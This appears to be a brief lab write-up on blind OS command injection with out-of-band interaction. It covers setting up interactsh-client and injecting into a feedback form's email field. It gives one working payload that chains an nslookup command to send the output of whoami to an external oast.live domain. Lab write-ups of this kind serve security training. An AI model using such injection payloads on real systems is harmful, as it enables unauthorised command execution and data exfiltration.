Topic :  Blind OS command injection with out-of-band interaction

Concept:  Out-of-band (OAST-style) OS command injection is like planting a tripwire that goes off somewhere *other than* the normal request/response channel. Instead of injecting a command and seeing its output directly in the web page or response (classic **in-band** injection), you trigger the vulnerable server to reach out to you over a different channel—DNS, HTTP, ICMP, etc.—and you watch for that signal.

End Goal : Implementing Out of Band interaction in os command injection

Analysis : 

- For this challenge, you have to setup interactsh-client to do this for free.
- After the installation process,
- Start the interactsh-client

- This gives you the public domain you can use for oast style attacks
- Again we are given that the vuln is in the feedback form, hence we retrieve the request first…
- This time, the command is executed asynchronously and has no effect on the application's response.
- When we use the payload [`qw@qw.com](mailto:qw@qw.com) & nslookup $(whoami).d30blkcgtqkkvta9geu05fbyg5pkdhrb1.oast.live #` in the email parameter. We will get the output like this…

- This would give us the output.
